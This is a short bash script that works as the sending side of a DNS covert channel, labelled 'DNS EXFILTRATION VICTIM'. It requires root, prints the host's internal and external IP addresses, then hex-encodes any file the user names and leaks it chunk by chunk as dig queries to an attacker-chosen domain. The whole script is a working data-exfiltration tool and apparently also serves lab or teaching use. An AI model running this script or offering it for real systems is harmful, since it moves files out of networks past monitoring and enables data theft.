#!/bin/bash
#Covert channel over DNS
echo  -e "\n#######################################################################"
echo "########################DNS EXFILTRATION VICTIM########################"
echo -e "#######################################################################\n"

RED='\033[0;31m'
NC='\033[0m'

USAGE() {
  echo "Usage: ${0} [-q]" >&2
  echo "DNS covert channel utility" >&2
  echo -e "  -q  Quiet mode.  Supress all DNS output.  Default: verbose\n" >&2
  exit 1
}

#Parse the script options
while getopts q OPTION
do
  case ${OPTION} in
    q)  QUIET='true' ;;
    ?)  USAGE ;;
  esac
done

#It may not always be necessary, but run the script as root
if [[ "${UID}" -ne 0 ]]
then
  echo -e "Please run the script as root.\n" >&2
  USAGE
  exit 1
fi

#Check for required utilities: curl, xxd and dig
echo "Checking for required utilites:"
echo "-------------------------------"
EXIT_STATUS=0
for PROG in curl xxd dig
do
  which ${PROG} &> /dev/null
  if [[ "${?}" -ne 0 ]]
  then
    echo -e "${PROG} is ${RED}NOT${NC} present.  Please install before continuing." >&2
    EXIT_STATUS=2
    continue
  else
    echo "${PROG} is installed."
  fi
done

if [[ "${EXIT_STATUS}" -ne 0 ]]
then
  echo
  exit ${EXIT_STATUS}
fi

echo -e "\nYour EXTERNAL IP address is: " $(curl -s ipv4.icanhazip.com)  #Be advised - this may trigger IDS alerts
echo "Your INTERNAL IP address is: " $(ip addr show | grep 'inet '| grep -v 127 | cut -d ' ' -f 6 | cut -d '/' -f 1)
echo
echo "Type the full path of a file name to encode and exfiltrate, the press ENTER: "
read ENCFILE

#Check for existence of the file
#mktmp for attacker
if [[ ! -e ${ENCFILE} ]]
then
  echo -e "\nThe file does not exist or cannot be read." >&2
  exit 1
fi

echo -e "\nType a bogus domain name to use for the DNS queries, then press ENTER: "
read DOMAIN

echo
echo "Make sure the attacker is running and press ENTER to continue: "
read CHOICE

for LINE in $(cat ${ENCFILE} | xxd -p)
do
    if [[ "${QUIET}" = 'true' ]]
    then
      dig ${LINE}.${DOMAIN} &> /dev/null
    else
      dig ${LINE}.${DOMAIN}
    fi
done

echo -e "\nExiting the DNS covert channel utility...\n"
sleep 1
exit 0
